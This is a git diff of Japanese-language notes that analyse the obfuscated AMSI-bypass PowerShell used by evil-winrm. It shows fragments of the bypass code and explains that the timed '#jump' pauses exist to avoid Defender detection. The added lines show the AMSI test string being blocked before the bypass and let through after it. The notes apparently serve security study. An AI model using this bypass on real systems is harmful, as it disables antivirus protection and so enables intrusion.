@@ -120,8 +120,8 @@ _".,_,.__).,) (.._( ._),     )  , (._..( '.._"._, . '._)_(..,_(_".) _( _')
 [+] exit
 ```
 AMSIをバイバスるるためにPowershellが実行される  
-このPowershellは、evil-winrmのコード上では難読化されている
-ちなみにこのPowershellを一気に実行するとDefenderでは検知されるので、「#jamp」コードで２秒待機するようになっている
+このPowershellは、evil-winrmのコード上では難読化されている  
+ちなみにこのPowershellを一気に実行するとDefenderでは検知されるので、各「#jamp」コードごとに２秒待機するようになっている
 ```powershell
 FUncTIon Get-PZ2zmpurexnDXVSxx {
     Param ($ljOHgifgLteNDYGV, $HWN81YY7isiEXwOd)
@@ -215,4 +215,20 @@ $UQXThoSh2exMyo = [SYsTem.RuNtiMe.INtErOpSeRvIcES.MArsHal]::Copy($hpBlHjUMs, 0, 
 #jump
 Remove-Item Function:Get-iy2kysa7yS
 #jump
+```
+実際にAMSIバイパスできたか確認  
+ 'AMSI Test Sample: 7e72c3ce-861b-4339-8740-0ac1484c1386'という文字列は、PowershellでのAMSI検知用のテスト文字列
+```powershell
+PS C:\Users\me> 'AMSI Test Sample: 7e72c3ce-861b-4339-8740-0ac1484c1386'
+発生場所 行:1 文字:1
++ AMSI Test Sample: 7e72c3ce-861b-4339-8740-0ac1484c1386
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+このスクリプトには、悪質なコンテンツが含まれているため、ウイルス対策ソフトウェアによりブロックされています。
+    + CategoryInfo          : ParserError: (:) [], ParentContainsErrorRecordException
+    + FullyQualifiedErrorId : ScriptContainedMaliciousContent
+```
+それでは先程のPowershellコードを実行すると、検知されていないことが分かった
+```powershell
+PS C:\Users\me> 'AMSI Test Sample: 7e72c3ce-861b-4339-8740-0ac1484c1386'
+AMSI Test Sample: 7e72c3ce-861b-4339-8740-0ac1484c1386
 ```
